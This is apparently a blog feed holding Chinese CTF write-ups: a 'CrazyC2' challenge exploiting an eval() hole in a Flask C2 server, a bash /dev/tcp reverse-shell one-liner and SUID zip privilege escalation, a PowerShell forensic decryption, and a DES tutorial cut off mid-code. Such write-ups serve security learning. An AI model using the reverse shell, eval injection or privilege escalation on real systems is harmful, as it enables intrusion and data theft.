        <content type="html"><![CDATA[<blockquote><p>本来在CTF中应该都是基操，但是因为本人太菜，弄了好几天才出。。。（T0T）</p></blockquote><p>题目</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165312088.png" alt="image-20240402165312088"></p><p>先是流量分析，看到了很多TCP和HTTP流，追踪大概看一下</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402164740735.png" alt="image-20240402164740735"></p><p>看起来传输了很多加密的信息，先把它们全都手动整理出来</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402164916818.png" alt="image-20240402164916818"></p><p>直接解base64解不出，但是POST传参时看到了一个random_key，猜是异或用的，果然</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165223751.png" alt="image-20240402165223751"></p><p>看到用curl从攻击机读取了一个文件，我也试着读了一下，发现可以从攻击机中读到任意文件，于是读到了第一个flag</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165620146.png" alt="image-20240402165620146"></p><p>从读一些不存在的文件产生的报错中可以看到python flask源码，读下来进行审计</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402165819762.png" alt="image-20240402165819762"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">clients = &#123;<span class="string">&quot;4ace608657cba629&quot;</span>: &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;random_key&quot;</span>: <span class="number">95</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/init&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    client_id = secrets.token_hex(<span class="number">8</span>)</span><br><span class="line">    random_key = secrets.randbelow(<span class="number">255</span>)</span><br><span class="line">    clients[client_id] = &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;echo hello&quot;</span>, <span class="string">&quot;random_key&quot;</span>: random_key&#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;client_id&quot;</span>: client_id, <span class="string">&quot;random_key&quot;</span>: random_key&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/recv&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_command</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(client_id, data[<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    command = clients[client_id].get(<span class="string">&quot;command&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    encrypted_command = encrypt_command(</span><br><span class="line">        command, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;encrypted_command&quot;</span>: encrypted_command&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/send&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">eval</span>(data[<span class="string">&quot;random_key&quot;</span>]) != clients[client_id][<span class="string">&quot;random_key&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;data error&quot;</span>, <span class="number">200</span></span><br><span class="line">    encrypted_data = data[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    decrypted_data = decrypt_data(</span><br><span class="line">        encrypted_data, clients[client_id][<span class="string">&quot;random_key&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received data: <span class="subst">&#123;decrypted_data.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Received data&quot;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/files&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_file</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    client_id = data[<span class="string">&quot;client_id&quot;</span>]</span><br><span class="line">    random_key = data[<span class="string">&quot;random_key&quot;</span>]</span><br><span class="line">    path = data[<span class="string">&quot;path&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> client_id <span class="keyword">not</span> <span class="keyword">in</span> clients.keys():</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid client_id&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> clients[client_id][<span class="string">&quot;random_key&quot;</span>] == <span class="built_in">int</span>(random_key):</span><br><span class="line">        <span class="keyword">return</span> send_file(path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(</span><br><span class="line">            &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;incorrect random_key&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_command</span>(<span class="params">command, key</span>):</span><br><span class="line">    encrypted_data = xor(command, key)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_data).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">    encrypted_data = base64.b64decode(encrypted_data)</span><br><span class="line">    <span class="keyword">return</span> xor(encrypted_data, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, debug=<span class="literal">True</span>, port=<span class="number">1337</span>, use_reloader=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flask_thread = Thread(target=run_flask_app)</span><br><span class="line">    flask_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="built_in">input</span>(<span class="string">&quot;Enter command: &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> client_id <span class="keyword">in</span> clients.keys():</span><br><span class="line">            clients[client_id][<span class="string">&quot;command&quot;</span>] = command</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Executing: <span class="subst">&#123;command&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到在判断random_key是否正确的地方存在一个我们CTFer最喜欢的eval，于是可以通过这个漏洞执行RCE</p><p>反弹shell拿下C2服务器</p><p>给攻击机传bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1”</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2024-04-02-170509.png" alt="屏幕截图 2024-04-02 170509"></p><p>自己的服务器监听2333端口</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402170726047.png" alt="image-20240402170726047"></p><p>ps aux查看一下运行的程序</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402171043213.png" alt="image-20240402171043213"></p><p>可以看到C2服务器是用tmux运行的，那么用tmux回到这个会话（后来开放了ssh，用ssh连，先把自己的公钥配置进去，这里不再赘述）</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180037287.png" alt="image-20240402180037287"></p><p>有点问题，那么就先把前面的tmux进程kill了再启动，根据它给的id和key改一下server.py，kill了再启动</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180438620.png" alt="image-20240402180438620"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180615128.png" alt="image-20240402180615128"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402180708976.png" alt="image-20240402180708976"></p><p>输指令反弹shell</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2024-04-02-180909.png" alt="屏幕截图 2024-04-02 180909"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181031310.png" alt="image-20240402181031310"></p><p>可以看到现在的用户是ctf，但是flag在&#x2F;root&#x2F;flag.txt下，需要提权</p><p>这里用suid提权，先看一下哪些文件有suid权限</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181207616.png" alt="image-20240402181207616"></p><p>在<a href="https://gtfobins.github.io/gtfobins/zip/">gtfobins</a>上面查到可以利用&#x2F;usr&#x2F;bin&#x2F;zip提权读取文件，以此得到第二个flag</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181337524.png" alt="image-20240402181337524"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/image-20240402181431988.png" alt="image-20240402181431988"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 Wrong Direction!</title>
      <link href="/posts/ff8462d1/"/>
      <url>/posts/ff8462d1/</url>
      
        <content type="html"><![CDATA[<p>这次不用volatility2了，试试volatility3</p><p>filescan一下，在桌面上看到个叫成绩单的表格</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328132138952.png" alt="image-20240328132138952"></p><p>把它dump下来</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328132551305.png" alt="image-20240328132551305"></p><p>在这张表格的第275行发现了一串powershell命令</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328194801457.png" alt="image-20240328194801457"></p><p>那么就去查看一下powershell的evtx日志文件。powershell的日志文件主要有PowerShell.evtx，Powershell Operational.evtx，Powershell Admin.evtx三种，这里在Powershell Operational.evtx中可以找到执行的命令记录</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328200431086.png" alt="image-20240328200431086"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328195639155.png" alt="image-20240328195639155"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328195922747.png" alt="image-20240328195922747"></p><p>可以看到有两串Scriptblock文本，把它们合起来</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328200118331.png" alt="image-20240328200118331"></p><p>可以看到所有的变量名都经过了混淆，手动改回去</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328200218045.png" alt="image-20240328200218045"></p><p>这下看起来舒服多了(</p><p>可以看见最终的密文被输入到了一个叫做text.txt的文件中，去找找，dump一下</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328200502193.png" alt="image-20240328200502193"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328200611602.png" alt="image-20240328200611602"></p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328200642356.png" alt="image-20240328200642356"></p><p>接下来就是写个ps1脚本进行解密，由于不熟悉powershell，废了好大功夫。。。</p><p>exp:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hash</span><span class="params">(<span class="variable">$text</span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$md5</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Security.Cryptography.MD5CryptoServiceProvider</span><br><span class="line">    <span class="variable">$utf8</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.UTF8Encoding</span><br><span class="line">    <span class="variable">$hash</span> = [<span class="type">System.BitConverter</span>]::ToString(<span class="variable">$md5</span>.ComputeHash(<span class="variable">$utf8</span>.GetBytes(<span class="variable">$text</span>))).replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&#x27;</span>).ToLower()</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hash</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decode</span><span class="params">(<span class="variable">$cypherText</span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$numbers</span> = [<span class="built_in">string</span>]::Join(<span class="string">&quot;&quot;</span>, ([<span class="type">regex</span>]::Matches(<span class="variable">$k3y</span>, <span class="string">&quot;\d+&quot;</span>)).Value)</span><br><span class="line">    <span class="variable">$seed</span> = [<span class="built_in">int</span>]<span class="variable">$numbers</span>.Substring(<span class="number">0</span>,<span class="number">5</span>)</span><br><span class="line">    <span class="variable">$rand</span> = <span class="built_in">New-Object</span> System.Random(<span class="variable">$seed</span>)</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$cypherText</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable">$keyposition</span> = <span class="number">0</span></span><br><span class="line">    <span class="variable">$decryptedText</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$byte</span> <span class="keyword">in</span> <span class="variable">$bytes</span>) &#123;</span><br><span class="line">        <span class="variable">$decryptedChar</span> = [<span class="built_in">char</span>](<span class="variable">$byte</span> <span class="operator">-bxor</span> (<span class="variable">$rand</span>.Next()%<span class="number">256</span>))</span><br><span class="line">        <span class="variable">$decryptedText</span> += <span class="variable">$decryptedChar</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decryptedText</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decode2</span><span class="params">(<span class="variable">$pass</span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$key</span> = [<span class="built_in">Byte</span>[]](<span class="variable">$pass</span>.PadRight(<span class="number">24</span>).Substring(<span class="number">0</span>,<span class="number">24</span>).ToCharArray())</span><br><span class="line">    <span class="variable">$secureString</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-String</span> <span class="variable">$d</span> <span class="literal">-Key</span> <span class="variable">$key</span></span><br><span class="line">    <span class="variable">$decryptedText</span> = [<span class="type">Runtime.InteropServices.Marshal</span>]::PtrToStringAuto([<span class="type">Runtime.InteropServices.Marshal</span>]::SecureStringToBSTR(<span class="variable">$secureString</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decryptedText</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$Script:key</span> = <span class="string">&quot;MyS3cr37K3y1sH3r3101&quot;</span></span><br><span class="line"><span class="variable">$Script:k3y</span> = Hash(<span class="variable">$key</span>)</span><br><span class="line"><span class="variable">$text</span>=<span class="string">&quot;&quot;</span>   <span class="comment">#这里填入密文</span></span><br><span class="line"><span class="variable">$Script:d</span>=(Decode(<span class="variable">$text</span>))</span><br><span class="line">Decode2(<span class="variable">$k3y</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328201823496.png" alt="image-20240328201823496"></p><p>看到这个熟悉的504B的开头，就知道是我们最爱的zip了</p><p>放进010editor或者其他什么二进制编辑器，保存为zip文件</p><p>虽然这个zip文件好像有些损坏，但是并没有伤及要害，仍然可以解压(</p><p>于是，得flag</p><p><img src="/images/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/image-20240328202122988.png" alt="image-20240328202122988"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2024 Writeup</title>
      <link href="/posts/f3024426/"/>
      <url>/posts/f3024426/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/NKCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES加密原理</title>
      <link href="/posts/966f3dbe/"/>
      <url>/posts/966f3dbe/</url>
      
        <content type="html"><![CDATA[<p>参考了<a href="https://blog.csdn.net/weixin_52553215/article/details/124215865">这篇文章</a></p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>DES（Data Encryption  Standard）是一种对称加密算法，它将64位的明文分成64位的块，并使用64位的密钥来进行加密操作。虽然DES本身只能处理64位的数据块，但是可以通过分组密码模式（如ECB、CBC、CFB、OFB、CTR等）来加密更长的数据。</p><h2 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h2><p>输入明文M（64位），根据下表进行初始置换，得到IP</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">60,52,44,36,28,20,12,4,</span><br><span class="line">62,54,46,38,30,22,14,6,</span><br><span class="line">64,56,48,40,32,24,16,8,</span><br><span class="line">57,49,41,33,25,17, 9,1,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">61,53,45,37,29,21,13,5,</span><br><span class="line">63,55,47,39,31,23,15,7,</span><br></pre></td></tr></table></figure><p>如将M的第58位填入IP的第一位。</p><p>然后将IP平分为两段，L0和R0</p><h2 id="生成子密钥"><a href="#生成子密钥" class="headerlink" title="生成子密钥"></a>生成子密钥</h2><p>一图以概之</p><img src="/images/DES加密/4433f1aedb9f4df98c7cbb7a783a7bda.png" alt="4433f1aedb9f4df98c7cbb7a783a7bda" style="zoom: 80%;" /><p>首先，一开始输入的64位key按照下表进行转换，生成56位密钥（置换选择1）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">57,49,41,33,25,17,9,1,</span><br><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">60,52,44,36,63,55,47,39,</span><br><span class="line">31,23,15,7,62,54,46,38,</span><br><span class="line">30,22,14,6,61,53,45,37,</span><br><span class="line">29,21,13,5,28,20,12,4</span><br></pre></td></tr></table></figure><p>实际上，这里只从原始密钥中取了56位进行变换，原始密钥中每字节的最高位是没有被使用的。</p><p>得到子密钥（56位）后，将变换后的子密钥分成两部分，C0和D0</p><p>得到C0和D0后，分别进行循环左移位操作，得到C1<del>C16和D1</del>D16的值，每一次循环移位的位数如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1</span><br></pre></td></tr></table></figure><p>如C0&#x3D;1111000011001100101010101111</p><p>C1&#x3D;1110000110011001010101011111</p><p>C2&#x3D;1100001100110010101010111111</p><p>将每组Cn和Dn组合起来，得到十六组数据再次按照下表进行替换，得到K1~K16（置换选择2）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">14,17,11,24,1,5,</span><br><span class="line">3,28,15,6,21,10,</span><br><span class="line">23,19,12,4,26,8,</span><br><span class="line">16,7,27,20,13,2,</span><br><span class="line">41,52,31,37,47,55,</span><br><span class="line">30,40,51,45,33,48,</span><br><span class="line">44,49,39,56,34,53,</span><br><span class="line">46,42,50,36,29,32</span><br></pre></td></tr></table></figure><h2 id="轮函数"><a href="#轮函数" class="headerlink" title="轮函数"></a>轮函数</h2><p>对上面初始置换中得到的L0和R0，我们在这里进行16轮加密变换，下面的图<del>（嫖来的）</del>描述了这个流程，其中函数f后面会叙述</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/2e1e54d0330a4d21a4aeada39bd0ca72.png" alt="2e1e54d0330a4d21a4aeada39bd0ca72"></p><p>由图知，L0通过与f函数运算后的结果进行异或后成为了R1，R0直接用作L1</p><p>下面是对f函数实现过程的具体描述</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/01d6b86ae2844e53b304002dc3c36db2.png" alt="01d6b86ae2844e53b304002dc3c36db2"></p><h3 id="扩充-置换："><a href="#扩充-置换：" class="headerlink" title="扩充&#x2F;置换："></a>扩充&#x2F;置换：</h3><p>此处的32位Rn先进行扩充置换变成了48位（因为我们需要将其与48位的子密钥异或）。</p><h3 id="与密钥异或"><a href="#与密钥异或" class="headerlink" title="与密钥异或"></a>与密钥异或</h3><p>在扩充后，与之前生成的对应轮数的子密钥Kn进行异或运算</p><h3 id="代换-选择"><a href="#代换-选择" class="headerlink" title="代换&#x2F;选择"></a>代换&#x2F;选择</h3><p>将48位的数据转换为32位。这一步是整个DES算法的核心，简称S盒。</p><h4 id="S盒"><a href="#S盒" class="headerlink" title="S盒"></a>S盒</h4><p><img src="/images/DES%E5%8A%A0%E5%AF%86/e6cccba809c648ad96d79f2119b1d083.png" alt="e6cccba809c648ad96d79f2119b1d083"></p><p>对于每个S盒，对照着4行16列的表，6比特输入中的第1比特和第6比特组成的二进制数来确定行，中间4位二进制数来确定列，对应行、列位置的十进制数的4位二进制数表示作为输出。</p><h3 id="置换"><a href="#置换" class="headerlink" title="置换"></a>置换</h3><p>经过置换表进行置换</p><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>与对应环节的Ln进行异或</p><h2 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h2><p>将L16和R16位置交换</p><h2 id="逆初始置换"><a href="#逆初始置换" class="headerlink" title="逆初始置换"></a>逆初始置换</h2><p><strong>这里的置换方式与前面的不一样！</strong></p><p>这里的方式与前面的都恰好相反。</p><p>例如：</p><p>原始数据的第1位置换到了第40位，第2位置换到了第8位。则逆置换就是将第40位置换到第1位，第8位置换到第2位。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">40,8,48,16,56,24,64,32,</span><br><span class="line">39,7,47,15,55,23,63,31,</span><br><span class="line">38,6,46,14,54,22,62,30,</span><br><span class="line">37,5,45,13,53,21,61,29,</span><br><span class="line">36,4,44,12,52,20,60,28,</span><br><span class="line">35,3,43,11,51,19,59,27,</span><br><span class="line">34,2,42,10,50,18,58,26,</span><br><span class="line">33,1,41,9,49,17,57,25</span><br></pre></td></tr></table></figure><p>至此可以得到密文C</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>参考了<a href="https://blog.csdn.net/weixin_44034444/article/details/121055630">这篇文章</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 